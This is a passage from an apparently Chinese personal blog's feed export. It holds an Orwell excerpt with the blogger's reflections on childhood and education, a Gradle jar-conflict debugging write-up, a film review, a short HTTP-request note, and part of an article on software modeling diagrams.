<p>怎么知道孩子自己的真实感受和想法？一个表面看来好像很快活的孩子可能在事实上遭到了他不能也不愿泄露的可怕的事。他生活在一种陌生的水底世界里，我们只能用记忆或猜想来探明。我们的主要线索是，我们自己曾经是孩子，但是许多人似乎完全忘记了他们自己童年时代的气氛。比如想一想把孩子送回学校去时让他穿着花纹不对的衣服而且不肯看到这对他来说是一件事关紧要的事，这样做对孩子造成的不必要的苦恼!在这样的问题上，有时孩子会表示抗议，但是在大多数的情况下，他的态度是隐忍不发。不向成年人表露自己真实的感情从七八岁起似乎成了一种本能。甚至你对孩子的爱，你想要保护和珍视他的愿望，也会成为误会的原因。也许，你能够比爱成人那样更加爱一个孩子，但是不能由此就仓促断定孩子会对你有任何爱的回报。我回顾自己的童年，在婴孩时代过去以后，我认为我对任何成人都没有感到过爱，除了我母亲，而且即使对她，我也不是信任的，理由是羞怯使我对她掩藏了许多真实感情。爱，那种自发的，没有条件的感情，我只能对年轻的人感到。对于那些年老的人——要记住对一个孩子来说，三十岁以上，或者甚至二十五岁以上就算“年老”了——我可以有敬畏、尊重、钦佩或者惭愧的感情，但是似乎有一层由害怕和羞怯夹杂着人体上的厌恶织成的薄纱把我同他们隔绝开来。人们太容易忘记孩子是不愿同成人发生身体上接触的了。成人那么大的个子，他们的笨拙僵硬的身体，他们的粗糙多皱的皮肤，他们的厚厚松弛的眼皮，他们的发黄的牙齿，他们的发霉衣服、汗水、啤酒、烟草交杂的气味动不动就从他们身上散发出来!在孩子的心目中成人之所以丑陋，一部分是由于孩子往往得抬头看他们所造成的，很少脸孔从下往上看时是处在最佳状态的。此外，在皮肤、牙齿和脸色上，由于自己很稚嫩白净，因此孩子对这方面有高得难以达到的标准。但是最大的障碍是孩子对年龄的错误概念。孩子很难设想三十岁以后的生活，因此在判断别人的年龄时会犯很荒唐的错误。他会把二十五岁的人看作四十岁，把四十岁的人看作六十五岁，依此类推。例如，我爱上爱尔西时正把她看作是个大人。我再见到她时，我十三岁，她大概才二十三岁；可是她在我看来好像已是个中年妇女了，过了她的最佳年华。而且孩子把年龄增长看成是几乎到了令人憎厌程度的灾难，而由于某种神秘的原因，这是永远不会发生到自己身上的。所有过了三十岁的人都是一点没有乐趣的怪物，总是咋呼着没有重要意义的事情，为了不值得活的原因——从孩子方面来看——而活着。只有孩子的生活才是真正的生活。自以为受到学生爱戴和信任的老师事实上背后是受到他们的学样和嘲笑的。一个成人如果不显得危险，那就几乎总是显得可笑的。</p>
<p>我的这些概括都是以我记忆所及的自己童年时代的看法为根据的。记忆虽然靠不住，但是在我看来，它似乎是我们要弄清孩子是怎么想的主要手段。只有唤起我们自己的记忆，我们才能认识孩子对世界的看法是怎么的扭曲，甚至到了不可相信的程度。例如，如果我按现在这个年龄回到圣塞浦里安去看它在一九一五年的情况，在我的心目中，圣塞浦里安会是怎么一个样子呢？对傻包和翻脸这两个可怕的权力无比的妖魔，我会有什么想法呢？我会把他们看成是一对愚蠢、浅薄、无足轻重的夫妇，一心一意要在社会阶梯上向上爬，而任何一个有头脑的人都可以看到这个阶梯快要垮了。我不会再害怕他们，就像我不会害怕睡鼠一样。此外，在那些日子里，我觉得他们已经十分老了，而我想——虽然我没有十分把握——他们大概比我如今还年轻一些。而那个胳膊像个铁匠，满脸讥嘲的强尼·哈尔又会是什么样子呢？只不过是个邋遢的小孩子，与其他成百上千的邋遢的小孩子没有什么区别。这两套事实可以并存在我的脑海里，因为这都是我自己的记忆。但是我很难用其他孩子的眼光来看，除非借助于想象，但这是可能把我引入歧途的。孩子和大人生活在不同的世界里。如果是这样，我们就不能有把握说，学校，至少是寄宿学校，对许多孩子来说，不像过去那样可怕了。撇开上帝、拉丁文、教鞭、阶级差别和性的禁忌不谈，恐惧、憎恨、势利和误解可能仍都留在那里。必须看到，我自己的主要问题是完全缺乏任何的比例感或概率感。这使我接受和相信荒诞，为了实际上毫不重要的事情感到痛苦。光是说我“傻”，说我“应该聪明些”是不够的。回顾你自己的童年时代，想一想你曾经相信的胡说八道和能使你痛苦的琐事。当然，我自己的情况有我个人特有的细微差别。但是基本上这也是无数其他孩子的情况。孩子的弱点是他是以一张白纸开始的。他既不理解也不怀疑他所生活的社会，由于他的轻信，别人可以影响他，使他有自卑感，使他害怕违反神秘的可怕的准则。也许，我在圣塞浦里安遇到的一切，在最“开明”的学校里也可能发生，虽然可能在形式上含蓄一些。但是，有一件事情我是感到相当有把握的，那就是寄宿学校比走读学校更糟糕。一个孩子就近有自己的家当避难所，他的境遇就会好一些。我认为英国上层和中层阶级的特有的缺点可能一部分是由于孩子八九岁甚至七岁的时候就离家到寄宿学校去，这种做法直到如今才不那么普遍。</p>
<p>我从来没有回到圣塞浦里安去过。校友重逢、校友聚餐等等这种活动，即使在我记忆是友好的时候，使我感到的反应也不仅仅是冷淡而已。我甚至从来没有去过伊顿，在那里的时候，我还是比较快活的。有一次，在一九三三年，我曾经经过那里，我很有兴趣地注意到，似乎什么都没有变，除了商店如今在出售收音机了。至于圣塞浦里安，多年之中我憎厌这个名字到了这么深的程度，以至我不能以足够超然的态度来看我在那里遇到的事情的意义。可以说，只是在过去的十年中，我才真正地想过我的学生时代，尽管它的生动记忆一直浮现在我的脑际。我相信，如今我如再去看那地方，如果它还存在的话，它不会对我造成什么影响了。（我记得几年前传说它已被烧毁了。)如果我要路过伊斯特布恩，我是不会故意绕过不去那学校的；如果我正好经过学校，我甚至可能会在它的低低的砖墙（墙边有一条很陡的河岸)旁驻足，望过平坦的操场，看一眼那丑陋的校舍和它前面铺有沥青的广场。而且如果我进去，重新闻到那间大教室的霉味，教室里的松香，澡堂的浊水味和冰凉的厕所的尿臊味，我想我只会感到你在重访童年时代任何情景时都会有的感觉：一切都变小了，而我自己又是老得多么厉害!但是事实是，多年来我没有再看它一眼的心情。除非出于十分不得已的必要，我是不会再踏上伊斯特布恩这地方的。我甚至对苏塞克斯也形成了偏见，因为它是圣塞浦里安所在的那个郡，长大以后我只到过苏塞克斯一次，作短期访问。但是，如今，这个地方已永远对我不再有任何影响了。它的魔力已不再灵了。我甚至对它再也没有足够的敌意而希望翻脸和傻包早死，或者学校被烧毁的传说是确实的。</p>
<p>写于一九四七年五月；刊于一九五二年</p>
<p>九至十月号《党见评论》</p>
</blockquote>
<blockquote>
<p>摘自：《我为什么要写作》第二篇收录《如此欢乐的童年》 — 〔英〕乔治·奥威尔。 本作品由上海译文出版社授权豆瓣阅读全球范围内电子版制作与发行。</p>
</blockquote>
<p>一百多年过去了，这样的问题谁敢说现在不是依然严峻。在社会大环境上，看似在向积极正确的价值观上引导孩子，但是沦落到局部—学校或家族—依然输出的是利益导向的价值观，而受到这样环境而不自知的孩子比比皆是（我的弟弟就是一例，近几年我眼看着他的价值观被环境所扭曲，而我能给他的帮助有限，我很无奈）。而在家庭环境中家长们正在焦虑怎样给孩子落户，让孩子上最好的学校—就连富裕的家庭也在为此争先恐后—而忽略了孩子的真实感受和想法，这固然需要更多的时间和精力成本，甚至我会以为家长们极力去为孩子争取物质上的优越条件是为了逃避这个问题，但事实是大部分家庭没有意识到或忽略了这个问题。而这个问题处理不好会给孩子带来的影响不确定性太大，你完全无法预测这种影响究竟会走向积极，抑或是走向另一个极端，像奥威尔这样最终能积极自省觉悟拥有独立思维的案例毕竟在少数，即便如此他在少时也曾有诸多困惑与局限，更不用说大部分家庭的情况，谁又敢说社会上诸多不稳定因素和可怕的事件与此无关呢。 </p>
<p>家庭环境的影响是问题的根源，但也恰恰是解决问题的关键所在（撇开文中国家、宗教、阶级等因素不谈）。我不喜欢现在身边大人哄孩子的方式，他们会用小孩的口吻去和小孩互动，但这样孩子就能理解吗？他们无非笑或哭；如果用大人的思维去与之交流，同样是不理解，但对他们来说是有潜移默化的影响—和学语言一样。只有产生了真正有效的沟通，才不至于让孩子心存困惑，留下伤痛，产生对事物的错误的看法。倘若我养育一个孩子，我会留心他对上学第一天穿着花纹不对的看法；会直接询问其感受；凡事同意或反对皆告知其真实理由，这虽不可谓不耿直，但和让他做正确的事情比起来，我耿直反倒是好事。</p>
]]></content>
      <categories>
        <category>reading</category>
      </categories>
      <tags>
        <tag>奥威尔</tag>
        <tag>我为什么要写作</tag>
        <tag>如此欢乐的童年</tag>
        <tag>童年</tag>
        <tag>教育</tag>
      </tags>
  </entry>
  <entry>
    <title>一次解决jar包依赖冲突问题的过程</title>
    <url>/technology/2017/08/%E4%B8%80%E6%AC%A1%E8%A7%A3%E5%86%B3jar%E5%8C%85%E4%BE%9D%E8%B5%96%E5%86%B2%E7%AA%81%E9%97%AE%E9%A2%98%E7%9A%84%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="案发背景"><a href="#案发背景" class="headerlink" title="案发背景"></a>案发背景</h1><p>同事最近在对项目的hibernate框架进行升级，从<code>3.6.10.Final</code>升级至<code>5.2.10.Final</code>。升级期间出现了配置文件(xml)解析报错。主要报错堆栈如下</p>
<figure class="highlight verilog"><table><tr><td class="code"><pre><span class="line"><span class="number">19</span>:<span class="number">07</span>:<span class="number">41</span> ERROR - Context initialization failed x org<span class="variable">.springframework</span><span class="variable">.beans</span><span class="variable">.factory</span><span class="variable">.BeanCreationException</span>: Error creating bean <span class="keyword">with</span> name &#x27;serviceManager&#x27; defined in <span class="keyword">class</span> path resource [spring/applicationContext<span class="variable">.xml</span>]: Cannot resolve reference to bean &#x27;xService&#x27; <span class="keyword">while</span> setting bean <span class="keyword">property</span> &#x27;xSerivce&#x27;; nested exception is org<span class="variable">.springframework</span><span class="variable">.beans</span><span class="variable">.factory</span><span class="variable">.BeanCreationException</span>: Error creating bean <span class="keyword">with</span> name &#x27;xService&#x27; defined in <span class="keyword">class</span> path resource [spring/dao<span class="variable">.xml</span>]: Cannot resolve reference to bean &#x27;transactionManager&#x27; <span class="keyword">while</span> setting bean <span class="keyword">property</span> &#x27;transactionManager&#x27;; nested exception is org<span class="variable">.springframework</span><span class="variable">.beans</span><span class="variable">.factory</span><span class="variable">.BeanCreationException</span>: Error creating bean <span class="keyword">with</span> name &#x27;transactionManager&#x27; defined in <span class="keyword">class</span> path resource [spring/dataSource-common<span class="variable">.xml</span>]: Cannot resolve reference to bean &#x27;sessionFactory&#x27; <span class="keyword">while</span> setting bean <span class="keyword">property</span> &#x27;sessionFactory&#x27;; nested exception is org<span class="variable">.springframework</span><span class="variable">.beans</span><span class="variable">.factory</span><span class="variable">.BeanCreationException</span>: Error creating bean <span class="keyword">with</span> name &#x27;sessionFactory&#x27; defined in <span class="keyword">class</span> path resource [spring/dataSource-common<span class="variable">.xml</span>]: Invocation of init method failed; nested exception is</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">java<span class="variable">.lang</span><span class="variable">.NoSuchMethodError</span>:org<span class="variable">.apache</span><span class="variable">.xerces</span><span class="variable">.impl</span><span class="variable">.xs</span><span class="variable">.XMLSchemaLoader</span><span class="variable">.loadGrammar</span>([Lorg/apache/xerces/xni/parser/XMLInputSource;)V</span><br></pre></td></tr></table></figure>

<h1 id="寻找线索"><a href="#寻找线索" class="headerlink" title="寻找线索"></a>寻找线索</h1><p>可以看到最后的一段日志<code>java.lang.NoSuchMethodError:org.apache.xerces.impl.xs.XMLSchemaLoader.loadGrammar([Lorg/apache/xerces/xni/parser/XMLInputSource;)V</code></p>
<p>说明<code>XMLSchemaLoader</code>类的<code>loadGrammar</code>方法没有找到，这个方法的特征(L)是有一个数组<code>XMLInputSource</code>类型的数组参数。</p>
<h1 id="寻找第一案发现场"><a href="#寻找第一案发现场" class="headerlink" title="寻找第一案发现场"></a>寻找第一案发现场</h1><p>顺着这个线索我们来看下找一下这个方法。</p>
<p>搜索源文件发现有两个jar包(见下图)都包含<code>XMLSchemaLoader#loadGrammar</code><img src="http://img.willowspace.cn/willowspace_2016/1503061978595.png"></p>
<p>两者的<code>XMLSchemaLoader</code>类都有<code>loadGrammar</code>方法。__重点来了__，不同的是前者没有参数为<code>XMLInputSource</code>数组的<code>loadGrammar</code>方法，而后者有。这与报错堆栈完全吻合，可见这就是第一案发现场。</p>
<h1 id="寻找真凶"><a href="#寻找真凶" class="headerlink" title="寻找真凶"></a>寻找真凶</h1><p>有了上面的线索，很自然想要去<a href="http://mvnrepository.com/">maven仓库</a>中看看是不是<code>xerces</code>包太老需要升级，搜索<code>xerces</code>后发现的确有问题，<code>xerces</code>已经建议使用<code>xercesImpl</code>替换了，看来真凶就是这个<code>xerces</code>包。</p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1503062212136.png"></p>
<p>于是回到项目中去掉<code>xerces:2.4.0</code>的依赖，重启启动项目，依旧报错。</p>
<p>这时考虑是不是有其他jar包也存在对该包的引用，去生成的依赖库中一看，果然，<code>xerces</code>的依赖版本从<code>2.4.0</code>变为了<code>2.0.2</code>依然存在于依赖之中</p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1503062472355.png"></p>
<p>这时基本可以断定就是其他包依赖了<code>xerces</code>，于是使用<code>gradle</code>的命令查看jar包依赖关系</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看gradle依赖关系</span></span><br><span class="line">gradle dependencies</span><br></pre></td></tr></table></figure>

<p><img src="http://img.willowspace.cn/willowspace_2016/1503062716227.png"></p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1503063619467.png"></p>
<p>从依赖关系从看到<code>commons-dbcp:1.2.1``commons-pool:1.2</code>这两个包依赖了<code>xerces:xerces:2.0.2</code>包，导致依旧引入了<code>xerces</code>依赖。去除<code>commons-dbcp:1.2.1</code>并升级<code>commons-pool:1.2</code>至<code>commons-pool:1.6</code>后刷新，<code>xerces</code>包依赖完全被去除。重启项目，一切顺畅，问题得以解决。</p>
<h1 id="结案"><a href="#结案" class="headerlink" title="结案"></a>结案</h1><p>这次问题的本质就是jar包冲突，只不过冲突的jar包依赖关系藏得较为隐蔽。</p>
<p>解决的手段其实较为简单，就是调和冲突的jar包（删除、升级、替换等）。</p>
<blockquote>
<p>注意</p>
</blockquote>
<p>上面我们为了解决jar包冲突直接删除了<code>commons-dbcp</code>依赖，这是因为我的项目已经不需要用到这个包了，但如果这个依赖包不能删除，如何单独删除其中冲突的jar包依赖呢？</p>
<p>这里提供一种<code>gradle</code>具体的调和手段</p>
<p>可以使用<code>exclude</code>去除jar包对第三方jar包的依赖，从而达到解决冲突的目的，具体写法如下。</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">dependencies &#123;</span><br><span class="line">	compile(<span class="string">&#x27;commons-dbcp:commons-dbcp:1.2.1&#x27;</span>) &#123;</span><br><span class="line">    	exclude <span class="attr">module:</span> <span class="string">&#x27;xerces&#x27;</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>technology</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>debug</tag>
        <tag>gradle</tag>
        <tag>maven</tag>
        <tag>依赖冲突</tag>
      </tags>
  </entry>
  <entry>
    <title>《看不见的旋律》—— 脑回路跟不上的曲折情节</title>
    <url>/film/2019/02/%E3%80%8A%E7%9C%8B%E4%B8%8D%E8%A7%81%E7%9A%84%E6%97%8B%E5%BE%8B%E3%80%8B%E2%80%94%E2%80%94-%E8%84%91%E5%9B%9E%E8%B7%AF%E8%B7%9F%E4%B8%8D%E4%B8%8A%E7%9A%84%E6%9B%B2%E6%8A%98%E6%83%85%E8%8A%82/</url>
    <content><![CDATA[<p>今晚放映了🎥 《看不见的旋律》&#x2F;《The Blind Melody》，着实被惊艳了一番，想不到印度拍悬疑犯罪片能到这个水平（主要是和之前看的印度片有反差），不枉我苦苦寻此片源。</p>
<p>该片极尽情节化、戏剧化之能事。全片塞满精巧设计的情节这点相当大胆，但由于伴随情节的伏笔和神转折（还有部分蒙太奇满足强迫症需要）比比皆是，所以大量的情节设置非但没让人感到冗余，反而引人入胜，甚至有点想笑 。顺序加插叙的叙事结构和首尾呼应的叙事技巧更是给人惊喜和回味（让人回味起《低俗小说》）。</p>
<p>至于影片的视听语言、镜头运用以及剪辑也相当吸引眼球，里面的歌曲填词很耿直也很搞笑（看了你就知道），不过这些和剧情之曲折离奇相比没有那么引人注目，也就不多说剧透了，自己去观赏吧。只是有一幕让我个人印象深刻：女主两年后在欧洲街头看到 A-KASH 在一个地下酒吧演出，镜头跟随女主进入地下酒吧听完了 A-KASH 的演奏（曲目是其专门为女主谱写）。这一幕让我想起《La La Land》里米娅走进小塞的爵士酒馆听完《Mia &amp;  Sebastian‘s Theme》以及小塞没有落下的那最后一个音符，相信同样喜欢这两部电影的朋友一定会和我有同样的联想吧（有的话欢迎来聊骚）。</p>
<p>此片院线上映必火，我说的 </p>
]]></content>
      <categories>
        <category>film</category>
      </categories>
      <tags>
        <tag>视听语言</tag>
        <tag>剪辑</tag>
        <tag>叙事结构</tag>
        <tag>叙事手法</tag>
        <tag>镜头运用</tag>
        <tag>情节</tag>
      </tags>
  </entry>
  <entry>
    <title>一次完整的http请求经历了怎样的过程</title>
    <url>/technology/2017/09/%E4%B8%80%E6%AC%A1%E5%AE%8C%E6%95%B4%E7%9A%84http%E8%AF%B7%E6%B1%82%E7%BB%8F%E5%8E%86%E4%BA%86%E6%80%8E%E6%A0%B7%E7%9A%84%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<blockquote>
<p>本文将介绍完整的http请求过程。</p>
</blockquote>
<h1 id="http请求的完整过程"><a href="#http请求的完整过程" class="headerlink" title="http请求的完整过程"></a>http请求的完整过程</h1><p><img src="http://img.willowspace.cn/willowspace_2016/1504634741775.png"></p>
<h1 id="TIPS"><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h1><h2 id="查看chrome客户端DNS"><a href="#查看chrome客户端DNS" class="headerlink" title="查看chrome客户端DNS"></a>查看chrome客户端DNS</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chrome://net-internals/#sdch</span><br></pre></td></tr></table></figure>

<h2 id="使用mtr命令显示链路传输状况"><a href="#使用mtr命令显示链路传输状况" class="headerlink" title="使用mtr命令显示链路传输状况"></a>使用<code>mtr</code>命令显示链路传输状况</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mtr $domain</span><br><span class="line">mtr $ip</span><br></pre></td></tr></table></figure>

<p><img src="http://img.willowspace.cn/willowspace_2016/1504632218689.png"></p>
]]></content>
      <categories>
        <category>technology</category>
      </categories>
      <tags>
        <tag>http</tag>
        <tag>网络请求</tag>
        <tag>DNS</tag>
        <tag>TCP</tag>
      </tags>
  </entry>
  <entry>
    <title>互联网产品可视化建模方法</title>
    <url>/technology/2020/01/%E4%BA%92%E8%81%94%E7%BD%91%E4%BA%A7%E5%93%81%E5%8F%AF%E8%A7%86%E5%8C%96%E5%BB%BA%E6%A8%A1%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<ul>
<li><a href="#%E4%B8%80%E3%80%81%E5%BB%BA%E6%A8%A1%E6%A6%82%E8%BF%B0">一、建模概述</a><ul>
<li><a href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%BB%BA%E6%A8%A1%EF%BC%9F">什么是建模？</a></li>
<li><a href="#%E5%BB%BA%E6%A8%A1%E6%BC%94%E5%8F%98%E5%8E%86%E7%A8%8B">建模演变历程</a></li>
</ul>
</li>
<li><a href="#%E4%BA%8C%E3%80%81%E7%BB%93%E6%9E%84%E5%8C%96%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95">二、结构化分析方法</a><ul>
<li><a href="#%E6%95%B0%E6%8D%AE%E5%BB%BA%E6%A8%A1%E2%80%94%E2%80%94ER%E5%9B%BE">数据建模——ER图</a></li>
<li><a href="#%E5%8A%9F%E8%83%BD%E5%BB%BA%E6%A8%A1%E2%80%94%E2%80%94DFD%E5%9B%BE">功能建模——DFD图</a></li>
<li><a href="#%E8%A1%8C%E4%B8%BA%E5%BB%BA%E6%A8%A1%E2%80%94%E2%80%94STD%E5%9B%BE">行为建模——STD图</a></li>
</ul>
</li>
<li><a href="#%E4%B8%89%E3%80%81%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95">三、面向对象分析方法</a><ul>
<li><a href="#%E7%BB%93%E6%9E%84%E5%BB%BA%E6%A8%A1">结构建模</a></li>
<li><a href="#%E8%A1%8C%E4%B8%BA%E5%BB%BA%E6%A8%A1">行为建模</a></li>
<li><a href="#%E5%8A%9F%E8%83%BD%E5%BB%BA%E6%A8%A1">功能建模</a></li>
</ul>
</li>
<li><a href="#%E5%9B%9B%E3%80%81%E7%BB%93%E6%9D%9F%E8%AF%AD">四、结束语</a></li>
</ul>
<p>需求分析师在需求调研分析工作中经常会用到各种分析方法，但对各种建模方法没有体系化的认识，经常讲概念混淆。本文从常用的结构化分析方法和面向对象分析方法着手，对各种建模方法进行梳理，帮助理解其含义及作用。</p>
<h1 id="一、建模概述"><a href="#一、建模概述" class="headerlink" title="一、建模概述"></a>一、建模概述</h1><h2 id="什么是建模？"><a href="#什么是建模？" class="headerlink" title="什么是建模？"></a>什么是建模？</h2><p>建模就是采用表格化、图形化、公式化的方式，将系统的构成及其构成间的关系呈现给人们的一种技术方法。[1]可能是因为软件本身的不可见，使得软件的建模也显得抽象，但在平常生活中，建模随处可见，比如盖房子，需要画图纸，画图纸就是建模的过程，而图纸就是建模产出的模型。在楼盘预售时，房子都还没建好，地产商会先做个缩小版的原型出来，甚至做个样板房让顾客有直观的感受，这个也是建模。当房子卖出去了，屋主需要装修了，找装修公司设计，设计师根据屋主需要设计一套图纸，甚至细到水电的走线，这些也是建模。因此将开发软件比作盖房子，其建模过程就相当于绘制图纸的过程。<br>可以说对软件系统进行建模的目的是帮助我们按照实际情况或按我们需求的样式对系统进行可视化；提供一种详细说明系统的结构或行为的方法；给出一个知道系统构造的模板；对我们所作出的决策进行文档化。</p>
<h2 id="建模演变历程"><a href="#建模演变历程" class="headerlink" title="建模演变历程"></a>建模演变历程</h2><p>软件建模并不是从来就有的，而是随着软件工程的发展而不断演变。主要经过了三个阶段。<br>第一阶段：程序&#x3D;数据结构+算法<br>出现于20世纪50<del>60年代，软件开发主要解决的是科学计算问题，Fortran语言是其代表。其建模关键点是选择合适的数据结构和算法。<br>第二阶段：结构化分析方法<br>出现于20世纪60</del>70年代，将解决一些与数据处理相关的问题，例如计费等。COBOL、C语言是其代表。其建模关键点有两方面，一是确定有哪些数据，格式是什么，如何存储，主要通过E&#x2F;R模型表达；二是确定数据的加工、处理过程，主要通过DFD（数据流图）表达。<br>第三阶段：面向对象分析方法<br>出现于20世纪80~90年代，信息系统覆盖了更多业务过程，数据不再是唯一的视角，事（业务流程）、人的视角越来越重要，因此加入更多这方面的建模工具。<br>目前结构化分析方法和面向对象分析方法仍广泛应用。</p>
<h1 id="二、结构化分析方法"><a href="#二、结构化分析方法" class="headerlink" title="二、结构化分析方法"></a>二、结构化分析方法</h1><p>结构化分析方法（Structured Analysis，简称SA）是将待解决的问题看做一个系统，从而用系统科学的思想方法（抽象、分解、模块化）来分析和解决问题，并基于功能分解设计系统结构，通过不断把复杂的处理逐层分解来简化问题，其最核心思想是自顶向下的分解。<br>结构化分析方法模型如下图所示：<br><img src="http://www.hrealtech.com/public/uploads/ueditor/image/20190824/1566646905704534.jpg" alt="1.jpg"><br>数据字典是模型的核心，是关于数据的信息集合，也就是对数据流图中包含的所有元素定义的集合。对于数据流图中出现的所有被命名的图形元素加以定义，使得每个图形元素的名字都有确切的解释。<br>实体关系图（ER图）：描述数据对象间的关系，用于数据建模。<br>数据流图（DFD图）：描述了数据流在系统中流动的过程，以及对数据流进行变换的功能，用于功能建模。<br>状态迁移图（STD图）：描述了对外部事件的响应方式，表示了系统的各种行为模式（称为状态）以及在状态间进行变迁的方式，用于行为建模。<br>可见，结构化分析方法包含3层建模，数据建模、功能建模以及行为建模。</p>
<h2 id="数据建模——ER图"><a href="#数据建模——ER图" class="headerlink" title="数据建模——ER图"></a>数据建模——ER图</h2><p>数据模型是为了把用户的数据要求清晰明确地表达出来所建立的一个概念性的模型，也称为概念模型，因此数据建模也称为概念建模。概念性模型是一种面向问题的数据模型，是按照用户的观点来对数据和信息进行建模。它描述了从用户角度看到的数据，也反映了用户的现实环境。<br>数据建模的目标是为了明确下列与数据处理相关的特定问题：</p>
<ul>
<li>系统处理哪些主要的数据对象？</li>
<li>每个数据对象的组成如何？</li>
<li>哪些属性描述了这些数据对象？</li>
<li>这些数据对象当前位于何处？</li>
<li>数据对象之间的关系？</li>
<li>数据对象和变换它们的处理之间有哪些关系？<br>数据模型常用ER图表示，ER图也称实体关系图(Entity Relationship Diagram)，提供了表示实体类型、属性和联系的方法。用矩形表示实体型，矩形框内写明实体名；用椭圆表示实体的属性，并用无向边将其与相应的实体型连接起来；用菱形表示实体型之间的联系，在菱形框内写明联系名，并用无向边分别与有关实体型连接起来，同时在无向边旁标上联系的类型（1:1,1:n或m:n）。ER图示例如下图所示。<br><img src="http://www.hrealtech.com/public/uploads/ueditor/image/20190824/1566646906154390.jpg" alt="2.jpg"><br>另外，对于设计方面的数据建模包括概念建模、逻辑建模和物理建模，而需求分析中的数据建模相当于设计中第一阶段的概念建模。由于是设计方面的建模方法，这里不再说明，详细信息可网上查找“详解数据建模的三个阶段”。</li>
</ul>
<h2 id="功能建模——DFD图"><a href="#功能建模——DFD图" class="headerlink" title="功能建模——DFD图"></a>功能建模——DFD图</h2><p>当数据或信息“流”过信息系统时将会被系统的功能所处理、加工活变换，再将处理或变换后的数据从系统中输出，DFD图从数据传递和加工角度，以图形方式来表达系统的逻辑功能、数据在系统内部的逻辑流向和逻辑变换过程。而功能建模正是通过DFD图将系统所需实现的功能绘制出来的过程。<br>DFD图的基本组成包括数据流、加工、数据存储和外部实体。通常用箭头标志数据流，用圆或椭圆表示加工，用双杠表示数据存储，用方框表示外部实体，即数据的源点或终点。DFD图示例如下图所示。<br><img src="http://www.hrealtech.com/public/uploads/ueditor/image/20190824/1566646907611082.jpg" alt="3.jpg"></p>
<h2 id="行为建模——STD图"><a href="#行为建模——STD图" class="headerlink" title="行为建模——STD图"></a>行为建模——STD图</h2><p>STD图（State Transition Diagram）用于描述系统或对象的状态，以及导致系统或对象状态发生改变的事件，从而描述系统的行为。它指明了作为特定事件的结果（状态），在状态中包含可能执行的行为。<br>STD图中，用圆圈表示可得到的系统状态，用箭头表示从一种状态向另一种状态的迁移，在箭头上要写上导致迁移的信号或事件的名称。STD图示例如下图所示。<br><img src="http://www.hrealtech.com/public/uploads/ueditor/image/20190824/1566646907537945.jpg" alt="4.jpg"></p>
<h1 id="三、面向对象分析方法"><a href="#三、面向对象分析方法" class="headerlink" title="三、面向对象分析方法"></a>三、面向对象分析方法</h1><p>面向对象方法是从内部结构上模拟客观世界 ,其基本思想认为对象是对现实世界客观实体的描述 ,均由其属性和相关操作组成 ,是系统描述的基本单位。面向对象方法更强调运用人类在日常的逻辑思维中经常采用的思想方法和原则 ,例如抽象、分类、继承、聚合、封装等 ,这使得软件开发者能更有效地思考问题 ,并以其他人也能看得懂的方式把自己的认识表达出来。<br>面向对象方法包括面向对象需求分析（OOA）、面向对象设计（OOD）、面向对象编程（OOP）。而面向对象分析方法主要经过3个建模过程，包括结构建模、行为建模和功能建模，3中建模均采用统一建模语言 UML (Unified Modeling Language)。<br>根据UML2.0标准，一共定义了13种不同的图，其功能各有不同，而OOA主要使用到其中的5种，分别是类图、活动图、用例图、构件图和部署图。</p>
<h2 id="结构建模"><a href="#结构建模" class="headerlink" title="结构建模"></a>结构建模</h2><p>结构建模也叫领域建模或概念建模，是对业务或系统的某个时刻或某段时间内的状态进行系统化描述，一般使用结构型的UML图进行结构建模。结构建模所表示的内容一般是静态的，在一段时间内是不会变化的。如用类图表示业务及业务之间的关系，用部署图、构件图表示系统的部署及架构设计。<br>类图示例如下图所示：<br><img src="http://www.hrealtech.com/public/uploads/ueditor/image/20190824/1566646908426056.jpg" alt="5.jpg"><br>构件图如下图所示：<br><img src="http://www.hrealtech.com/public/uploads/ueditor/image/20190824/1566646908600618.jpg" alt="6.jpg"><br>部署图如下图所示：<br><img src="http://www.hrealtech.com/public/uploads/ueditor/image/20190824/1566646909685663.jpg" alt="7.jpg"></p>
<h2 id="行为建模"><a href="#行为建模" class="headerlink" title="行为建模"></a>行为建模</h2><p>行为建模是系统化地分析业务活动及业务流程的过程，一般使用行为型的UML图进行结构建模。行为建模表达的是某段时间内事情是如何发展的，这些发展最后会达到怎样的效果。<br>业务流程分为生产性流程、管理性流程和支持性流程。生产性流程是流程中最重要的部分，是企业&#x2F;组织价值体现的核心；管理性流程是对生产性流程的管控，通常是有管理层发现的，对一些质量、效率进行监督的控制性流程；支持性流程是对生产性流程的一种补充，通常是由协作部门、本部门员工执行的工作。如果拿软件开发过程来比喻的话，需求分析、软件设计、软件编码、软件测试是生产性流程；项目管理、质量保证是管理性流程；而文档配置等属于支持性流程。通常生产性流程是最容易标识的，而管理性流程和支持性流程比较容易忽略，因此在需求分析时要特别注意。[2]<br>活动图示例如下图所示：<br><img src="http://www.hrealtech.com/public/uploads/ueditor/image/20190824/1566646909609583.jpg" alt="8.jpg"></p>
